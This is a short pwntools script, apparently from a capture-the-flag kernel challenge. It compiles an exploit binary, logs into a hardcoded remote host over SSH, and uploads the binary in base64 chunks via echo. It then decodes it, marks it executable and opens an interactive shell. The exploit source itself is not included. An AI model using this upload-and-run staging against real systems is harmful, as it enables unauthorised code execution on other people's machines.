#!/usr/bin/python
from pwn import *

HOST = "35.221.78.115"
PORT =  10022

USER = "pwn"
PW = "pwn"

PROMPT = "$ "

def compile():
    log.info("Compile")
    os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn")

def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil(PROMPT)

def upload():
    p = log.progress("Upload")

    with open("pwn", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)
    
    r.recvuntil(PROMPT)
    
    for i in range(0, len(encoded), 300):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+300]))
        
    exec_cmd("cat benc | base64 -d > bout")    
    exec_cmd("chmod +x bout")
    
    p.success()

def exploit(r):
    compile()
    upload()

    r.interactive()

    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        session = ssh(USER, HOST, PORT, PW)
        r = session.run("/bin/sh")
        exploit(r)
    else:
        r = process("./startvm")
        print util.proc.pidof(r)
        pause()
        exploit(r)
